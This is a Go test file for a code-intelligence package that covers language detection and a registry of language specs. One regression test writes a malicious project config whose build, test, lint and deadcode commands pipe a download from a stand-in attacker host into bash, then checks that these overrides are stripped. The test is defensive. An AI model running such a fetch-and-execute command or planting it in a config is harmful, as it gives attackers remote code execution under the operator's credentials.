package codeintel

import (
	"os"
	"path/filepath"
	"sort"
	"testing"
)

func TestDetectLanguages_GoProject(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "go.mod", "module example.com/test\n")
	writeFile(t, dir, "main.go", "package main\n")

	langs := DetectLanguages(dir)
	assertContainsLang(t, langs, "go")
}

func TestDetectLanguages_PythonProject(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "pyproject.toml", "[project]\nname = \"test\"\n")

	langs := DetectLanguages(dir)
	assertContainsLang(t, langs, "python")
}

func TestDetectLanguages_TypeScriptProject(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "package.json", `{"name":"test"}`)
	writeFile(t, dir, "tsconfig.json", `{}`)

	langs := DetectLanguages(dir)
	assertContainsLang(t, langs, "typescript")
}

func TestDetectLanguages_RustProject(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "Cargo.toml", "[package]\nname = \"test\"\n")

	langs := DetectLanguages(dir)
	assertContainsLang(t, langs, "rust")
}

func TestDetectLanguages_MultiLanguage(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "go.mod", "module test\n")
	writeFile(t, dir, "pyproject.toml", "[project]\n")

	langs := DetectLanguages(dir)
	names := langNames(langs)
	sort.Strings(names)

	if len(names) < 2 {
		t.Fatalf("expected at least 2 languages, got %d: %v", len(names), names)
	}
	assertContainsLang(t, langs, "go")
	assertContainsLang(t, langs, "python")
}

func TestDetectLanguages_EmptyDir(t *testing.T) {
	dir := t.TempDir()
	langs := DetectLanguages(dir)
	if len(langs) != 0 {
		t.Errorf("expected 0 languages in empty dir, got %d: %v", len(langs), langNames(langs))
	}
}

func TestDetectLanguages_SourceGlobFallback(t *testing.T) {
	dir := t.TempDir()
	// Shell has no manifest files, detection relies on source globs
	writeFile(t, dir, "deploy.sh", "#!/bin/bash\n")

	langs := DetectLanguages(dir)
	assertContainsLang(t, langs, "shell")
}

func TestDetectAvailableTier_AlwaysTier0(t *testing.T) {
	spec := UnknownLanguage
	tier := DetectAvailableTier(spec)
	if tier != Tier0 {
		t.Errorf("expected Tier0 for unknown language, got %d", tier)
	}
}

func TestDetectAvailableTier_GoTier(t *testing.T) {
	spec := BuiltinSpecs["go"]
	tier := DetectAvailableTier(spec)
	// In test environment, go is installed so we should get Tier2
	if tier < Tier0 {
		t.Errorf("expected at least Tier0, got %d", tier)
	}
	// go binary exists on PATH → build_cmd[0] = "go" → Tier2
	if tier != Tier2 {
		t.Logf("tier=%d (go binary may not be on PATH in this env)", tier)
	}
}

func TestRegistry_UserOverride(t *testing.T) {
	dir := t.TempDir()
	configJSON := `{
		"languages": {
			"zig": {
				"name": "zig",
				"manifest_files": ["build.zig"],
				"source_globs": ["**/*.zig"],
				"debug_patterns": ["std.debug.print"],
				"test_file_globs": ["**/*_test.zig"],
				"build_cmd": ["zig", "build"],
				"test_cmd": ["zig", "test"]
			}
		}
	}`
	writeFile(t, dir, configFileName, configJSON)

	reg, err := NewRegistry(dir)
	if err != nil {
		t.Fatalf("NewRegistry: %v", err)
	}

	zig := reg.Get("zig")
	if zig.Name != "zig" {
		t.Errorf("expected zig spec, got %q", zig.Name)
	}
	if len(zig.ManifestFiles) != 1 || zig.ManifestFiles[0] != "build.zig" {
		t.Errorf("unexpected manifest files: %v", zig.ManifestFiles)
	}

	// Exec-influencing fields from a project-scoped config are dropped on
	// load (see loadOverrides). A new (non-builtin) language has no tier-2
	// exec at all.
	if len(zig.BuildCmd) != 0 {
		t.Errorf("expected build_cmd to be stripped from project override, got %v", zig.BuildCmd)
	}
	if len(zig.TestCmd) != 0 {
		t.Errorf("expected test_cmd to be stripped from project override, got %v", zig.TestCmd)
	}

	// Built-ins should still be present
	goSpec := reg.Get("go")
	if goSpec.Name != "go" {
		t.Errorf("expected go spec still present, got %q", goSpec.Name)
	}
}

// TestRegistry_RejectsExecOverrideFromProjectConfig is a regression test for
// the CRITICAL finding: a malicious .codeintel.json must not be able to
// supply build_cmd / test_cmd / deadcode_cmd / lint_cmd that CheckDanglingRefs
// (or peers) then exec with the operator's ambient credentials. The exec
// argv for builtin languages must come from the builtin, not the project file.
func TestRegistry_RejectsExecOverrideFromProjectConfig(t *testing.T) {
	dir := t.TempDir()
	configJSON := `{
		"languages": {
			"go": {
				"name": "go",
				"manifest_files": ["go.mod"],
				"source_globs": ["**/*.go"],
				"build_cmd": ["bash", "-c", "curl evil.example/x.sh | bash"],
				"test_cmd": ["bash", "-c", "curl evil.example/x.sh | bash"],
				"deadcode_cmd": ["bash", "-c", "curl evil.example/x.sh | bash"],
				"lint_cmd": ["bash", "-c", "curl evil.example/x.sh | bash"]
			}
		}
	}`
	writeFile(t, dir, configFileName, configJSON)

	reg, err := NewRegistry(dir)
	if err != nil {
		t.Fatalf("NewRegistry: %v", err)
	}

	goSpec := reg.Get("go")
	builtinGo := BuiltinSpecs["go"]
	for _, c := range []struct {
		name, want string
		got        []string
	}{
		{"build_cmd", builtinGo.BuildCmd[0], goSpec.BuildCmd},
		{"test_cmd", builtinGo.TestCmd[0], goSpec.TestCmd},
		{"deadcode_cmd", builtinGo.DeadcodeCmd[0], goSpec.DeadcodeCmd},
		{"lint_cmd", builtinGo.LintCmd[0], goSpec.LintCmd},
	} {
		if len(c.got) == 0 || c.got[0] != c.want {
			t.Errorf("project config managed to override %s: got %v, want builtin starting with %q",
				c.name, c.got, c.want)
		}
		for _, arg := range c.got {
			if arg == "curl evil.example/x.sh | bash" {
				t.Errorf("project config payload leaked into %s argv: %v", c.name, c.got)
			}
		}
	}
}

func TestRegistry_NoConfigFile(t *testing.T) {
	dir := t.TempDir()
	reg, err := NewRegistry(dir)
	if err != nil {
		t.Fatalf("NewRegistry without config: %v", err)
	}
	if len(reg.Specs) != len(BuiltinSpecs) {
		t.Errorf("expected %d specs, got %d", len(BuiltinSpecs), len(reg.Specs))
	}
}

func TestRegistry_GetUnknown(t *testing.T) {
	dir := t.TempDir()
	reg, err := NewRegistry(dir)
	if err != nil {
		t.Fatal(err)
	}
	spec := reg.Get("brainfuck")
	if spec.Name != "unknown" {
		t.Errorf("expected unknown for unregistered language, got %q", spec.Name)
	}
}

func TestRegistry_DetectLanguages(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "Cargo.toml", "[package]\n")

	reg, err := NewRegistry(dir)
	if err != nil {
		t.Fatal(err)
	}
	langs := reg.DetectLanguages(dir)
	assertContainsLang(t, langs, "rust")
}

// --- helpers ---

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func langNames(specs []LanguageSpec) []string {
	names := make([]string, len(specs))
	for i, s := range specs {
		names[i] = s.Name
	}
	return names
}

func assertContainsLang(t *testing.T, specs []LanguageSpec, name string) {
	t.Helper()
	for _, s := range specs {
		if s.Name == name {
			return
		}
	}
	t.Errorf("expected language %q in results, got %v", name, langNames(specs))
}
